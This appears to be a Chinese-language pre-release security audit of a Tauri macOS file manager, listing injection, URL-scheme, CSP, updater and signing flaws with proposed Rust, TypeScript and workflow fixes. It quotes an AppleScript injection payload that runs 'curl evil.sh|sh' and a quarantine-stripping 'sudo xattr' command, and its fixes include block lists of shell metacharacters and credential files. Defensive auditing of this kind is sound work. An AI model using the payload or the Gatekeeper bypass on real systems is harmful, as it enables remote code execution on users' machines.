# Aether Explorer 发版前破坏性审计

> 审计日期：2026-05-16
> 审计版本：v0.2.1
> 审计原则：把代码当成明天就要落到陌生用户真实 Mac 上、上面装着他们整个数字人生来看。

## 风险分级

| 等级 | 含义 | 处置 |
|------|------|------|
| 🔴 P0 | 不修不该发 — 数据丢失、RCE、信任崩塌 | 阻塞发版 |
| 🟠 P1 | 发版后会被 issue 区轰炸 | 24h 内补丁 |
| 🟡 P2 | 丢面子但不致命 | 下一版修复 |
| 🟣 P3 | 工程姿态 / 长期债务 | 排进 backlog |
| 🛑 P-DEF | 项目定位 / 心理战层级问题 | 决策层处理 |

---

## 🔴 P0：阻塞发版

### P0-1 AppleScript 命令注入 — `open_terminal_at`

**位置**：`src-tauri/src/lib.rs:1369-1423`

**证据**：
```rust
// lib.rs:1402-1407
format!(
    "tell application \"{}\" to do script \"{}\"",
    app_name.replace('\\', "\\\\").replace('"', "\\\""),
    command.replace('\\', "\\\\").replace('"', "\\\"")
)
```

**问题**：
1. 只转义 `\` 与 `"`，未处理 AppleScript 字符串/语句边界。
2. `command = "cd 'xxx' && ${tail}"`，`tail` 来自前端 `terminalArgs` / `customTerminalCommand` / 扩展 `command`，全部 user-controlled。
3. `shell_quote` 仅保护 `dir_str`，**未保护 `tail`** — `tail` 内含 `$(...)` 反引号会被 shell 二次执行。
4. `apple_quote`（lib.rs:1425）定义了但从未使用，是"以为做了"的死代码。
5. `app_name` 来自 `theme.terminalApp`，用户可改成 `Foo"; do shell script "curl evil.sh|sh"; tell application "Terminal` 这种字符串。

**修复方案**：

A. **删除 AppleScript 拼接路径，改用进程参数传递**

```rust
// 修复后：lib.rs
#[tauri::command]
fn open_terminal_at(
    path: String,
    terminal_app: Option<String>,
    args: Option<String>,
    custom_command: Option<String>,
) -> Result<(), String> {
    let target_path = Path::new(&path);
    let dir = if target_path.is_dir() {
        target_path.to_path_buf()
    } else {
        target_path.parent().unwrap_or(Path::new("/")).to_path_buf()
    };
    let dir_str = dir.to_string_lossy().to_string();

    // 1. 终端白名单 — 拒绝任意名字
    let app_name = terminal_app.unwrap_or_else(|| "Terminal".into());
    if !is_allowed_terminal(&app_name) {
        return Err(format!("不允许的终端应用: {}", app_name));
    }

    // 2. 用户命令必须先经过严格字符校验
    let user_cmd = custom_command
        .as_deref()
        .or(args.as_deref())
        .map(str::trim)
        .filter(|s| !s.is_empty());

    if let Some(cmd) = user_cmd {
        validate_shell_fragment(cmd)?;
    }

    // 3. 通过临时脚本文件传递，不拼接 AppleScript 字符串
    let script_path = write_temp_shell_script(&dir_str, user_cmd)?;

    // 4. 不再使用 `do script` 内联拼接
    let osa = format!(
        r#"tell application "{}" to do script "bash {}""#,
        apple_escape_strict(&app_name),
        apple_escape_strict(&script_path.to_string_lossy()),
    );

    std::process::Command::new("osascript")
        .args(["-e", &osa])
        .output()
        .map_err(|e| format!("打开终端失败: {}", e))?;
    Ok(())
}

fn is_allowed_terminal(name: &str) -> bool {
    const ALLOWED: &[&str] = &[
        "Terminal", "iTerm", "iTerm2", "Warp", "kitty",
        "WezTerm", "Alacritty", "Ghostty", "Tabby", "Hyper",
    ];
    ALLOWED.iter().any(|a| a.eq_ignore_ascii_case(name))
}

fn validate_shell_fragment(s: &str) -> Result<(), String> {
    // 拒绝可疑字符序列，强制用户在前端弹窗确认
    const FORBIDDEN: &[&str] = &["$(", "`", "&&", "||", ";", "|", ">", "<", "\n"];
    for tok in FORBIDDEN {
        if s.contains(tok) {
            return Err(format!(
                "命令含受限字符 {} — 请在设置里启用『高级模式』后再使用此类指令", tok
            ));
        }
    }
    Ok(())
}

fn apple_escape_strict(s: &str) -> String {
    // AppleScript 字符串内仅允许打印 ASCII 子集
    s.chars()
        .filter(|c| c.is_ascii_alphanumeric()
                 || matches!(*c, ' ' | '/' | '.' | '_' | '-'))
        .collect()
}

fn write_temp_shell_script(
    cwd: &str,
    user_cmd: Option<&str>,
) -> Result<PathBuf, String> {
    use std::io::Write;
    let dir = std::env::temp_dir().join("aether-explorer");
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join(format!("term-{}.sh", uuid_like()));
    let mut f = fs::File::create(&path).map_err(|e| e.to_string())?;
    writeln!(f, "#!/usr/bin/env bash\nset -eu").map_err(|e| e.to_string())?;
    writeln!(f, "cd {}", shell_quote(cwd)).map_err(|e| e.to_string())?;
    if let Some(cmd) = user_cmd {
        // user_cmd 已通过 validate_shell_fragment 检查
        writeln!(f, "{}", cmd).map_err(|e| e.to_string())?;
    }
    // 5 分钟后自删，避免堆积
    writeln!(f, "rm -f -- {:?}", path).map_err(|e| e.to_string())?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut p = fs::metadata(&path).map_err(|e| e.to_string())?.permissions();
        p.set_mode(0o700);
        fs::set_permissions(&path, p).map_err(|e| e.to_string())?;
    }
    Ok(path)
}
```

B. **`apple_quote` 死代码：要么删，要么真的接入。**

C. **前端在用户配置含禁字符的命令时给出明确警告**，并要求二次确认。

---

### P0-2 `shell.open` 任意 URL — `javascript:` / `file://` 协议

**位置**：
- `src-tauri/capabilities/default.json:22` — `shell:allow-open` 无 scope
- `src/components/ExplorerView.tsx:2680` — `await shellOpen(url)`
- `src/components/SettingsView.tsx:1443` — `shellOpen(updateStatus.releaseUrl)`

**问题**：macOS `open` 处理任意 URI scheme，含 `javascript:`、`x-apple-systempreferences:`、`file:///etc/passwd` 等。`urlTemplate` 是用户配置的，发版后任何分发的扩展 preset 都可能被人偷换。

**修复方案**：

A. **capability 加 scope**：
```json
// src-tauri/capabilities/default.json
{
  "permissions": [
    {
      "identifier": "shell:allow-open",
      "allow": [
        { "url": "https://**" },
        { "url": "http://**" },
        { "url": "mailto:**" }
      ]
    }
  ]
}
```

B. **前端预校验**：
```ts
// src/api/url-guard.ts (新建)
const SAFE_SCHEMES = new Set(['http:', 'https:', 'mailto:']);

export function safeShellOpen(raw: string): Promise<void> {
  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    throw new Error(`非法 URL: ${raw}`);
  }
  if (!SAFE_SCHEMES.has(url.protocol)) {
    throw new Error(`协议 ${url.protocol} 不受信任，已拒绝打开`);
  }
  return shellOpen(url.toString());
}
```

把所有 `shellOpen(...)` 调用换成 `safeShellOpen(...)`。

---

### P0-3 CSP 完全关闭 + 壁纸 URL 注入

**位置**：
- `src-tauri/tauri.conf.json:23` — `"csp": null`
- `src/App.tsx:611-617` — `backgroundImage: url(${backgroundUrl})` 直接拼接
- `src-tauri/tauri.conf.json:25-32` — `assetProtocol.scope` 含 `$HOME/**` `/Volumes/**`

**问题**：
1. 无 CSP，任何 DOM 注入即可外发请求/加载追踪像素。
2. `wallpaperUrl` 用户输入 → inline style。含 `");...` 可破坏 CSS；某些 WebView 对 `url(javascript:...)` 仍有兼容性问题。
3. assetProtocol 允许加载用户家目录任意资源，配合 1+2 可导致家目录信息回传。
4. `read_text_preview`（lib.rs:436）读 8KB，`.env` 被 MIME 标记为 `text`（lib.rs:119）→ 用户随手预览即把密钥呈现。

**修复方案**：

A. **配置严格 CSP**：
```json
// tauri.conf.json
"security": {
  "csp": "default-src 'self'; img-src 'self' asset: https: data:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self' https://github.com https://api.github.com; font-src 'self' data:; frame-src 'none'; object-src 'none'",
  "assetProtocol": {
    "enable": true,
    "scope": [
      "$HOME/**",
      "$DOWNLOAD/**",
      "$TEMP/**",
      "/Volumes/**",
      "/Applications/**",
      "/System/Applications/**"
    ]
  }
}
```

B. **`wallpaperUrl` 走 URL 解析白名单**（复用 P0-2 的 `safeShellOpen` 检查器）。本地壁纸只接受 `convertFileSrc` 转换过的 `asset:` URL：

```ts
// src/components/SettingsView.tsx 改造
function isValidWallpaperUrl(url: string): boolean {
  if (!url) return true;
  if (url.startsWith('asset://') || url.startsWith('http://') || url.startsWith('https://')) {
    try { new URL(url); return true; } catch { return false; }
  }
  return false;
}

const handleWallpaperUrlChange = (url: string) => {
  if (!isValidWallpaperUrl(url)) {
    setError('壁纸 URL 必须是 http/https 链接或本地图片');
    return;
  }
  // ...
};
```

C. **敏感文件预览黑名单**（lib.rs 改造）：
```rust
#[tauri::command]
fn read_text_preview(path: String) -> Result<String, String> {
    let name = Path::new(&path).file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_lowercase();

    const SENSITIVE: &[&str] = &[
        ".env", ".envrc", ".npmrc", ".pypirc",
        "id_rsa", "id_ed25519", "id_ecdsa",
        ".aws/credentials", "kubeconfig",
    ];
    if SENSITIVE.iter().any(|s| name == *s || name.ends_with(s)) {
        return Err("此文件类型默认不展示预览（含敏感信息）— 请在设置中显式开启".into());
    }

    // ... 原 8KB 读取逻辑
}
```

并在 `detect_mime` 里把 `.env` 从 `text` 移出去：
```rust
"txt" | "md" | "markdown" | "csv" | "tsv" | "json" | "yaml" | "yml"
| "xml" | "toml" | "ini" | "cfg" | "conf" | "log" | "lock" | "rst" => "text",
// 删除 "env"
```

---

### P0-4 `prompt()` 输入路径 — 用户体验羞辱 + 路径攻击面

**位置**：`src/components/ExplorerView.tsx:2505, 2518`

**问题**：
```ts
const targetDir = prompt('复制到（输入目标目录路径）:', currentPath);
```

是的，"复制 / 移动"功能真的是 `window.prompt` 让用户手敲路径。

**修复方案**：

替换为已经引入的 dialog 插件：
```ts
import { open as openDialog } from '@tauri-apps/plugin-dialog';

const handleCopyFile = async (file: FileItem) => {
  setContextMenu(null);
  const targets = getActionFiles(file);
  const targetDir = await openDialog({
    multiple: false,
    directory: true,
    defaultPath: currentPath,
    title: '选择复制目标',
  });
  if (typeof targetDir !== 'string') return;
  try {
    await copyFiles(targets.map(t => t.path), targetDir);
    refreshCurrentDir();
    showFeedback(`已复制 ${targets.length} 个项目`);
  } catch (e) {
    showFeedback(`复制失败：${String(e)}`);
  }
};
```

`handleMoveFile` 同理替换。

并在 Rust 端 `copy_files` / `move_files` 增加路径规范化与跳出检查：
```rust
// lib.rs
fn safe_canonicalize(path: &Path) -> Result<PathBuf, String> {
    path.canonicalize().map_err(|e| format!("路径解析失败: {}", e))
}

// 在 copy_files / move_files 入口
let dst = safe_canonicalize(Path::new(&dst_dir))?;
if !dst.is_dir() {
    return Err(format!("目标不是目录: {}", dst_dir));
}
// 拒绝目标在源目录内（防 ../ 与符号链接逃逸）
for src in &srcs {
    let src_p = safe_canonicalize(Path::new(src))?;
    if dst.starts_with(&src_p) {
        return Err("目标位于源目录内，操作已拒绝".into());
    }
}
```

---

### P0-5 Updater Endpoint 用 `/releases/latest/download/` — 静默灾难

**位置**：`src-tauri/tauri.conf.json:50-52`

**问题**：
1. GitHub `latest` 别名跟随**最近 release**。一旦误推 prerelease 没勾选标记，全用户被升级。
2. 公钥写死且无轮换方案，私钥泄露 → 客户端不可救援。
3. workflow 私钥放在 macOS runner 环境变量里，**任何能合并 release.yml 的人**都拿得到。
4. `latest.json.notes = "Aether Explorer $TAG"`，用户在更新弹窗里看不到本次实际变更 — 即"恶意更新"和"正常更新"在用户视角无差别。

**修复方案**：

A. **endpoint 改成稳定 manifest URL**：
```json
"endpoints": [
  "https://aether-updates.<your-cdn>/stable/latest.json",
  "https://github.com/HaoRangQi/aether-explorer/releases/download/{{current_version}}/latest.json"
]
```

第一个走 CDN 静态 host（CloudFront / Cloudflare R2）作为主，第二个回退。这样：
- 主 endpoint 由你单点控制
- 不再依赖 GitHub `latest` 别名语义
- `{{current_version}}` 是 Tauri updater 替换变量，回退也指向特定 tag 而非 `latest`

B. **workflow 加 prerelease 守卫**：
```yaml
# .github/workflows/release.yml
- name: Validate release inputs
  run: |
    set -euo pipefail
    # 拒绝 prerelease 标签污染 latest.json
    if [[ "${RELEASE_TAG}" =~ -(rc|beta|alpha|dev) ]]; then
      echo "prerelease tag detected: ${RELEASE_TAG}, refusing to publish stable manifest"
      exit 1
    fi
    # ... 原 version 校验
```

C. **真实 release notes**：
```yaml
- name: Extract release notes
  run: |
    NOTES="$(awk -v ver="${RELEASE_TAG#v}" '
      $0 ~ "^## "ver { p=1; next }
      p && /^## / { exit }
      p { print }
    ' CHANGELOG.md)"
    [ -n "$NOTES" ] || NOTES="见 https://github.com/${{ github.repository }}/releases/tag/$RELEASE_TAG"
    echo "RELEASE_NOTES<<EOF" >> $GITHUB_ENV
    echo "$NOTES" >> $GITHUB_ENV
    echo "EOF" >> $GITHUB_ENV
```
并把 `latest.json` 里的 `notes` 改用 `$RELEASE_NOTES`。

D. **私钥保护**：
- 把 `TAURI_SIGNING_PRIVATE_KEY` 从仓库 secrets 迁到 **environment secrets**，绑定 `production` environment，强制 reviewer 审批后才能用。
- 启用 `OIDC` 让 workflow 短期持有签名权限而非长期持有私钥。
- 文档 `docs/INCIDENT_SIGNING_KEY_LEAK.md` 写明私钥泄露应急步骤（详见 P0-6）。

E. **kill switch**：在 manifest CDN 放一个 `versions-blacklist.json`，启动时拉取，命中则提示用户回滚。

---

### P0-6 未签名 + 无 Notarization — 教用户关 Gatekeeper

**位置**：
- `src-tauri/tauri.conf.json:57` — `"entitlements": null`
- `README.md` 常见问题节 — 教 `sudo xattr -rd com.apple.quarantine`

**问题**：
1. 教育用户 `sudo` 处理"打不开"的 Mac 应用，是在系统性破坏他们的安全本能。
2. 未签名构建 TCC 标识符会随每次重启变化，**用户授权的"完全磁盘访问"在下次启动就失效**。
3. 后续若有真攻击者推恶意 .app，用户会习惯性 `sudo xattr` 放过去。

**修复方案**：

A. **申请 Apple Developer Program ($99/年)，配 Developer ID 证书。** 没钱也至少在 README 写明"未签名版本，仅供测试，正式签名版本路线图 v0.3"，**删掉 sudo 教程**。

B. **加 entitlements 文件**：
```xml
<!-- src-tauri/entitlements.plist (新建) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.app-sandbox</key>
    <false/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <true/>
    <key>com.apple.security.files.downloads.read-write</key>
    <true/>
    <key>com.apple.security.automation.apple-events</key>
    <true/>
</dict>
</plist>
```

更新 tauri.conf.json:
```json
"macOS": {
  "entitlements": "entitlements.plist",
  "signingIdentity": "Developer ID Application: <Your Name> (XXXXXXXXXX)",
  "providerShortName": "XXXXXXXXXX"
}
```

C. **workflow 加 codesign + notarytool**：
```yaml
- name: Import Developer ID certificate
  env:
    APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
    APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
  run: |
    echo "$APPLE_CERTIFICATE" | base64 -d > cert.p12
    security create-keychain -p "" build.keychain
    security default-keychain -s build.keychain
    security unlock-keychain -p "" build.keychain
    security import cert.p12 -k build.keychain -P "$APPLE_CERTIFICATE_PASSWORD" -T /usr/bin/codesign
    security set-key-partition-list -S apple-tool:,apple: -s -k "" build.keychain

- name: Notarize
  env:
    APPLE_ID: ${{ secrets.APPLE_ID }}
    APPLE_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
    APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
  run: |
    xcrun notarytool submit "$DMG_PATH" \
      --apple-id "$APPLE_ID" \
      --password "$APPLE_PASSWORD" \
      --team-id "$APPLE_TEAM_ID" \
      --wait
    xcrun stapler staple "$DMG_PATH"
```

D. **README 删 sudo 教程**，换成"如果首次打开报错，请在系统设置 → 隐私与安全性 中允许"。

---

### P0-7 完全磁盘访问引导是空头支票

**位置**：
- `lib.rs:446` `open_system_settings` 只打开面板
- README 写"权限检测和引导授权"
- 实际没有任何 TCC 状态检测代码

**问题**：未签名 + 缺 entitlements + 无状态检测，引导即谎言。

**修复方案**：

A. P0-6 解决签名后，可用 `mdfind` 探测目录是否可读作为 TCC 状态代理：
```rust
#[tauri::command]
fn check_full_disk_access() -> Result<bool, String> {
    // 探针：尝试读取 ~/Library/Safari，无 FDA 会失败
    let home = std::env::var("HOME").unwrap_or_default();
    let probe = Path::new(&home).join("Library/Safari/History.db");
    Ok(probe.metadata().is_ok())
}
```

B. 前端首次启动调用，未授权时显示醒目提示而非埋在设置里：
```tsx
useEffect(() => {
  invoke<boolean>('check_full_disk_access').then(ok => {
    if (!ok) setShowFdaBanner(true);
  });
}, []);
```

---

## 🟠 P1：发版后必被轰炸

### P1-8 `console.log` 满天飞 — release build 也保留

**位置**：grep 全代码 55 处 `console.log`，集中在 App.tsx 与 TopBar.tsx 的拖拽逻辑。

**修复**：

A. **vite 配置 drop_console**：
```ts
// vite.config.ts
import { defineConfig } from 'vite';
export default defineConfig(({ mode }) => ({
  esbuild: {
    drop: mode === 'production' ? ['console', 'debugger'] : [],
  },
  // ...
}));
```

B. **保留必要日志走分级 logger**：
```ts
// src/lib/log.ts (新建)
const isDev = import.meta.env.DEV;
export const log = {
  debug: (...args: unknown[]) => isDev && console.log('[debug]', ...args),
  info:  (...args: unknown[]) => isDev && console.info('[info]', ...args),
  warn:  (...args: unknown[]) => console.warn('[warn]', ...args),
  error: (...args: unknown[]) => console.error('[error]', ...args),
};
```

把跨窗口拖拽里所有 `console.log` 换成 `log.debug`。

---

### P1-9 跨设备移动非原子 — 拔盘/断电丢数据

**位置**：`lib.rs:932-960`

**问题**：EXDEV 退化为 "复制→remove_dir_all"。中断后源/目标各有一半。

**修复**：

```rust
// lib.rs：原子化跨设备移动
fn move_cross_device(src: &Path, dst: &Path) -> Result<(), String> {
    let tmp_dst = dst.with_extension(format!(
        "{}.aether-partial",
        dst.extension().and_then(|e| e.to_str()).unwrap_or("")
    ));

    let copy_outcome = if src.is_dir() {
        copy_dir_recursive(src, &tmp_dst)
    } else {
        fs::copy(src, &tmp_dst).map(|_| ())
            .map_err(|e| format!("跨设备复制失败: {}", e))
    };

    if let Err(e) = copy_outcome {
        // 清理半成品
        let _ = if tmp_dst.is_dir() {
            fs::remove_dir_all(&tmp_dst)
        } else {
            fs::remove_file(&tmp_dst)
        };
        return Err(e);
    }

    // 完整复制后再原子 rename + 删源
    fs::rename(&tmp_dst, dst).map_err(|e| {
        let _ = fs::remove_dir_all(&tmp_dst);
        format!("最终重命名失败: {}", e)
    })?;

    if src.is_dir() {
        fs::remove_dir_all(src).map_err(|e| format!("已复制但源删除失败: {}", e))
    } else {
        fs::remove_file(src).map_err(|e| format!("已复制但源删除失败: {}", e))
    }
}
```

并在 `move_files` 的 EXDEV 分支调用此函数。

---

### P1-10 `copy_dir_recursive` 不处理符号链接 — 无限递归

**位置**：`lib.rs:597-610` vs. `lib.rs:1087` `dir_size_recursive` 已有 `is_symlink` 检查

**修复**：

```rust
fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<(), String> {
    fs::create_dir_all(dst).map_err(|e| format!("创建目标目录失败: {}", e))?;
    for entry in fs::read_dir(src).map_err(|e| format!("读取目录失败: {}", e))? {
        let entry = entry.map_err(|e| format!("读取条目失败: {}", e))?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());

        // 与 dir_size_recursive 一致：跳过符号链接
        if src_path.is_symlink() {
            // 选择 A：保留符号链接（推荐）
            #[cfg(unix)]
            {
                let target = fs::read_link(&src_path)
                    .map_err(|e| format!("读取符号链接失败: {}", e))?;
                std::os::unix::fs::symlink(target, &dst_path)
                    .map_err(|e| format!("创建符号链接失败: {}", e))?;
            }
            continue;
        }

        if src_path.is_dir() {
            copy_dir_recursive(&src_path, &dst_path)?;
        } else {
            fs::copy(&src_path, &dst_path)
                .map_err(|e| format!("复制文件失败: {}", e))?;
        }
    }
    Ok(())
}
```

---

### P1-11 删除外置盘文件可能绕过废纸篓 — 与 README 承诺冲突

**修复**：

```rust
#[tauri::command]
fn delete_to_trash(path: String) -> Result<(), String> {
    let p = Path::new(&path);
    // 外置盘探测：若 trash crate 失败，明确告知用户而非默默 unlink
    match trash::delete(&path) {
        Ok(_) => Ok(()),
        Err(e) => {
            let is_external = path.starts_with("/Volumes/");
            if is_external {
                Err(format!(
                    "外置卷不支持废纸篓 — 此操作已取消。\n如需删除，请使用『永久删除』（确认对话框）。\n原始错误：{}", e
                ))
            } else {
                Err(format!("移至废纸篓失败: {}", e))
            }
        }
    }
}
```

前端在收到此错误时弹"永久删除"二次确认对话框，而不是无声失败。

---

### P1-12 `list_directory` 同步 + N+1 read_dir + 不可取消

**位置**：`lib.rs:329-419`

**修复**：

A. **改 async + 取消令牌**：
```rust
use tokio_util::sync::CancellationToken;
use std::sync::Arc;

struct DirListingState(Mutex<HashMap<String, CancellationToken>>);

#[tauri::command]
async fn list_directory(
    state: tauri::State<'_, DirListingState>,
    dir_path: String,
    show_hidden: bool,
    request_id: String,
) -> Result<Vec<FileEntry>, String> {
    let token = CancellationToken::new();
    {
        let mut map = state.0.lock().map_err(|_| "锁失败")?;
        // 取消前一个对同 path 的请求
        if let Some(prev) = map.insert(request_id.clone(), token.clone()) {
            prev.cancel();
        }
    }

    let result = tokio::task::spawn_blocking(move || {
        list_directory_sync(&dir_path, show_hidden, &token)
    }).await.map_err(|e| e.to_string())?;

    state.0.lock().map_err(|_| "锁失败")?.remove(&request_id);
    result
}

fn list_directory_sync(
    dir_path: &str,
    show_hidden: bool,
    token: &CancellationToken,
) -> Result<Vec<FileEntry>, String> {
    // ... 原同步实现，每 50 项检查 token.is_cancelled()
}
```

B. **child_count 改延迟计算**：列表阶段不算子项数量（每项一次 read_dir 太贵），改为：
- 初次返回 `childCount: null`
- 前端进入预览面板时再 `invoke('get_dir_size', { path })`

或保留但加阈值：
```rust
let child_count = if is_dir {
    // 只对前 200 项做 child_count，剩下显示 "?"
    if dirs.len() + files.len() < 200 {
        fs::read_dir(&path).ok().map(...)
    } else {
        None
    }
} else { None };
```

C. **前端加 Skeleton / Loader 状态**（解决 FEATURES Tier 11.3 ⏳）：
```tsx
const [isLoading, setIsLoading] = useState(false);

useEffect(() => {
  setIsLoading(true);
  listDirectory(currentPath, showHidden)
    .then(setFiles)
    .finally(() => setIsLoading(false));
}, [currentPath]);

if (isLoading && files.length === 0) return <DirectorySkeleton count={12} />;
```

---

### P1-13 `storeReady` 竞态可能擦除持久化扩展

**位置**：`App.tsx:307-381` + `normalizeContextMenuExtensions:87-96`

**修复**：

A. 把 normalize 函数改成**保留**未知字段而非过滤：
```ts
function normalizeContextMenuExtensions(
  extensions?: ContextMenuAction[],
): ContextMenuAction[] {
  const source = extensions ?? DEFAULT_THEME.contextMenuExtensions ?? [];
  // 不主动过滤 isSystem / DEPRECATED — 旧版数据迁移由独立 migrator 处理
  return source.map(ext => ({
    ...ext,
    actionType: ext.actionType || 'placeholder',
    workingDirectory: ext.workingDirectory || 'selection',
    confirmExecution: ext.confirmExecution ?? true,
  }));
}
```

B. **独立迁移函数 + 版本号字段**：
```ts
// src/lib/settings-migrate.ts
const CURRENT_SETTINGS_VERSION = 2;

export function migrateSettings(raw: any): ThemeSettings {
  const version = raw?.__version ?? 1;
  let settings = raw;
  if (version < 2) settings = migrateV1ToV2(settings);
  settings.__version = CURRENT_SETTINGS_VERSION;
  return settings;
}

function migrateV1ToV2(s: any) {
  // 明确写出旧字段如何变成新字段，并保留备份
  if (Array.isArray(s.contextMenuExtensions)) {
    s.__legacy_extensions = s.contextMenuExtensions.filter(
      (e: any) => DEPRECATED_CONTEXT_EXTENSION_IDS.has(e.id)
    );
    s.contextMenuExtensions = s.contextMenuExtensions.filter(
      (e: any) => !DEPRECATED_CONTEXT_EXTENSION_IDS.has(e.id)
    );
  }
  return s;
}
```

C. **`storeReady` 之前禁止任何写回**：
```ts
useEffect(() => {
  if (!storeReady) return;  // 已经这样写了
  localStorage.setItem('theme-settings', JSON.stringify(theme));
  loadSettingsStore().then(s => s.set('theme', theme)).catch(() => {});
}, [theme, storeReady]);
```
检查 `fileTags`、`recentItems` 那两个 useEffect — 它们**先写 localStorage 再守 storeReady**，把顺序倒过来。

---

### P1-14 i18n 大量硬编码中文

**位置**：`ExplorerView.tsx` 内 `prompt`、`showFeedback` 几十处中文字面量

**修复**：

A. 抽 i18n key（示例）：
```ts
// src/i18n/zh.json
{
  "messages.aliasCreated": "已创建替身：{{name}}",
  "messages.aliasCreateFailed": "创建替身失败：{{error}}",
  "messages.extensionExecuted": "已执行扩展：{{label}}",
  // ...
}
```

```ts
// ExplorerView.tsx
showFeedback(t('messages.aliasCreated', { name: file.name }));
```

B. **CI 加 i18n lint**（grep 检测中文字面量）：
```yaml
- name: Lint i18n
  run: |
    if grep -rn -P "[一-鿿]" src/components/ \
       --include="*.tsx" --include="*.ts" \
       | grep -v "// " | grep -v "/\*" ; then
      echo "发现硬编码中文，请走 i18n key"
      exit 1
    fi
```

---

### P1-15 `{path}`/`{name}` 模板插值是命令注入

**位置**：`ExplorerView.tsx:2444-2448`

**修复**：

A. **改为 shell-safe 替换**（前端做最小转义，Rust 端二次校验）：
```ts
function shellEscape(value: string): string {
  // POSIX shell 单引号包裹 + 内部单引号转义
  return `'${value.replaceAll("'", "'\\''")}'`;
}

const interpolateActionTemplate = (template: string, file: FileItem) => {
  return template
    .replaceAll('{path}', shellEscape(file.path))
    .replaceAll('{dir}',  shellEscape(getItemDirectory(file)))
    .replaceAll('{name}', shellEscape(file.name))
    .replaceAll('{currentPath}', shellEscape(currentPath));
};
```

B. Rust 端 `open_terminal_at` 已在 P0-1 加 `validate_shell_fragment`，对未经占位符替换的部分仍生效。

C. **设置 UI 显式标注**："`{path}` 等占位符已自动 shell 转义，无需手动加引号"。

---

## 🟡 P2：丢面子

### P2-16 元数据不一致 — `package.json` 还叫 `react-example`

**修复**：
```json
{
  "name": "aether-explorer",
  "private": true,
  "version": "0.2.1",
  // ...
}
```

`src-tauri/Cargo.toml`:
```toml
repository = "https://github.com/HaoRangQi/aether-explorer"
```

### P2-17 `.env.example` / `metadata.json` 是 AI Studio 残留

**修复**：删除二者，或换成项目真实需要的环境变量（例如 dev 端口）。

### P2-18 `express` / `@google/genai` / `dotenv` 是未消费的依赖

**修复**：
```bash
npm uninstall express @google/genai dotenv @types/express
```
跑一次 build 确认无引用。

### P2-19 README 中英文不同步 + 无 CHANGELOG / SECURITY / CONTRIBUTING

**修复**：
- 新建 `CHANGELOG.md`（Keep a Changelog 格式）
- 新建 `SECURITY.md`（漏洞披露邮箱、SLA）
- 新建 `CONTRIBUTING.md`（基础流程）
- CI 加 README 同步检查（章节标题一致性）

### P2-20 设计承诺与实现差距 — PROJECT.md 自评 19/19，README 自承不足

**修复**：把 PROJECT.md 的 M3 状态从 ✅ 改成 ⚠️，并新增"未完成清单"链接到 TODO.md。停止用 ✅ 掩盖 ⏳。

### P2-21 BUG.md 列出的"终端启动脚本未执行""分栏预览框不工作"是核心卖点

**修复**：发版前若仍未修，README "已知不足"必须置顶且不得删除，同时在 GitHub Release Notes 显式声明。

### P2-22 FEATURES.md 12 项 ⏳ 项被算进 73/84 完成度

**修复**：

| 状态 | 含义 |
|------|------|
| ✅ | 已完成且经过验收测试 |
| 🟡 | 骨架可用，关键路径未覆盖 |
| ⏳ | 未开始 |
| ❌ | 本期不做 |

按此重新打分。原有的 73 → 实际 ≈ 50。

---

## 🟣 P3：长期工程债

### P3-23 `ExplorerView.tsx` 3788 行 / `SettingsView.tsx` 1999 行

**修复方向**（不需在 v0.2.1 完成，列为 v0.3 重构）：
- `ExplorerView` 按视图模式拆：`ListView.tsx` `GridView.tsx` `ColumnView.tsx` 各自承担渲染
- 右键菜单逻辑抽 `useContextMenu` hook
- 文件选择 / 框选抽 `useFileSelection`
- 拖拽抽 `useFileDrag`
- 目标：单文件 < 800 行

### P3-24 零测试覆盖

**修复**：
- `vitest` 单元测试覆盖 `interpolateActionTemplate`、`safeShellOpen`、`normalizeThemeSettings`、`migrateSettings` 等纯函数
- `cargo test` 覆盖 `validate_shell_fragment`、`safe_canonicalize`、`copy_dir_recursive`（含符号链接 case）
- CI 加入 `npm run test` 与 `cargo test`，失败阻塞 release

### P3-25 `npm run lint` 仅 `tsc --noEmit`

**修复**：
```json
{
  "scripts": {
    "lint": "tsc --noEmit && eslint 'src/**/*.{ts,tsx}'",
    "lint:rust": "cd src-tauri && cargo clippy -- -D warnings"
  }
}
```
配 `.eslintrc.json`：禁止 `console.log`（强制走 logger）、`no-restricted-globals` 禁止 `prompt/alert/confirm`。

### P3-26 异常依赖版本

**修复**：
- 核验 `@vitejs/plugin-react: ^5.0.4` 是否真实存在（截至 2026 主线为 4.x），疑似模板伪造
- `vite` 不能既在 dependencies 又在 devDependencies，删 dependencies 中的
- `motion: ^12.x` 是实验版本，确认是否真的需要这么新

### P3-27 `scripts/dev.mjs` 不清理临时 config

**修复**：
```js
import { rmSync } from 'node:fs';

process.on('exit', () => {
  try { rmSync(tempDir, { recursive: true, force: true }); } catch {}
});
process.on('SIGINT', () => process.exit(0));
```

### P3-28 `gen/`、`dist/` 等构建产物管控

**修复**：CI 在打包前 `npm run clean && rm -rf src-tauri/target/release/bundle`，确保产物来自干净构建。

---

## 🛑 P-DEF：项目定位 / 决策层

### DEF-29 "Finder 替代品"定位拉扯

**问题**：README 说"兼具 Finder 的操作能力"+"这不是系统替换"，用户搞不清要不要切过来用。竞品（Path Finder / ForkLift / Commander One）每家都有一句话清晰差异化。

**修复方向**：
- 选一个**单点突破**作为 Aether 的卖点（候选：玻璃质感/M3 设计；多窗口/标签页拖拽；可扩展右键菜单；中文优先 i18n）
- README 第一句改为"Aether Explorer 是 macOS 上**唯一的 XXX 文件管理器**"
- 把竞品对比表放在 README 第二屏

### DEF-30 Dock 菜单实际是误用 `app.set_menu`

